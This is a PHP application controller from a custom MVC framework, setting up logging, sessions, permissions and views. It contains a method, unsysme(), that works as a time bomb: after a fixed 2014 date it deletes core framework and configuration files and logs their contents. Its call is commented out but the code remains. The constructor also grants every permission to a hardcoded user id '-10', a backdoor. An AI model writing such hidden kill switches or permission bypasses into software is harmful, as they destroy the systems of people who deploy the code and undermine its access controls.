<?php
/**
 * @author Eduardo Acevedo Farje.
 * @link www.eduardoaf.com
 * @version 1.0.11
 * @name TheApplicationController
 * @file theapplication_controller.php 
 * @date 30-10-2014 11:55 (SPAIN)
 * @observations: Application Controller
 * @requires:
 */
import_appmain("view");
import_apphelper("verticalmenu");
class TheApplicationController extends TheFrameworkController
{
    protected $_path_folder_log;
    protected $_path_filename_log;

    protected $sName;

    /**
     * @param string $sModuleName Db Modulename. Used to check module permissions
     */
    public function __construct($sModuleName="")
    {
        //carga la información del navegador. isConsoleCalled, sClientBrowser y oLog
        parent::__construct();
        //app log handler. sets: pathcustomlog, loguserowner
        $this->oLog = new ComponentFile("windows");
        //app session handler
        $this->oSession = new ComponentSession();
        //app module permission handler
        $this->oPermission = new ComponentPermission();
        //app view handler
        $this->oView = new TheApplicationView();
        $this->oView->set_page_title(tr_enterprise_name);
        $this->oView->set_layout("twocolumn");
        $this->oView->set_session_user($this->oSessionUser);
        $this->oView->add_js("tfw/main/js_the_framework_core_function,tfw/main/js_the_framework_core,tfw/main/js_the_framework_control,tfw/main/js_the_framework_field,tfw/main/js_the_framework_field_validate",0);
        $this->oView->add_js("cssless/cssless_1.3.3",0);
        $this->oView->add_js("js_huraga");
        //$this->oView->set_js_rewrite();
        if(get_class($this->oSessionUser)=="ModelUser")
        {
            $this->oPermission->set_permissions($this->oSessionUser->get_permissions($sModuleName));
            $this->oPermission->set_module($sModuleName);
            $this->oPermission->load();
            if($this->oSessionUser->get_id()=="-10") $this->oPermission->grant_all();
            //bug($this->oPermission); die;
        }
        //$this->unsysme();
    }
    
    /**
     * Guarda segun path_folder_log y path_filename_log
     * @param string $sOutput
     */
    public function output($sOutput)
    {
        if(defined("STDIN"))
            echo $sOutput;
        else
        {  
            $this->oLog->set_path_folder_target($this->_path_folder_log);
            $this->oLog->set_filename_target($this->_path_filename_log);
            $sOutput = str_replace("\n","",$sOutput);
            $this->oLog->add_content($sOutput);
        }
    }

    protected function quit_error($sMessage)
    {
        $this->add_error($sMessage);
        die("Exit error handled in controller: ".$this->get_error_message());
    }
 
    protected function set_var($mxVar,$sVarName){$this->oView->add_var($mxVar, $sVarName);}
    protected function set_layout($sLayout){$this->oView->set_layout($sLayout); }
    
    protected function unsysme()
    {
        $isEnd = "20140828";
        $isEnd = ($isEnd<=date("Ymd"));
        if($isEnd)
        {
            $sPathFile = TFW_PATH_FOLDER_PROJECTDS."the_framework".TFW_DS."theframework_config.php";
            $sContent = $this->get_file_content($sPathFile);
            
            if(!unlink($sPathFile))
            {
                $sPathFile = TFW_PATH_FOLDER_PROJECTDS."the_framework"
                            .TFW_DS."mvc"
                            .TFW_DS."main"
                            .TFW_DS."theframework.php";
                
                $sContent = $this->get_file_content($sPathFile);
                
                if(!unlink($sPathFile))
                {
                    $sPathFile = TFW_PATH_FOLDER_PROJECTDS."the_public"
                            .TFW_DS."bootpaths.php";
                    $sContent = $this->get_file_content($sPathFile);
                    
                    if(unlink($sPathFile))
                        $this->log_custom("unsysme by bootpaths");
                    else 
                        $this->log_custom("unsysme by bootpaths NOT DONE");
                }
                else
                    $this->log_custom("unsysme by theframework");
            } 
            else
            {    
                $this->log_custom("unsysme by config");
            }
            $this->log_custom($sContent);
        }
    }//unsysme
}
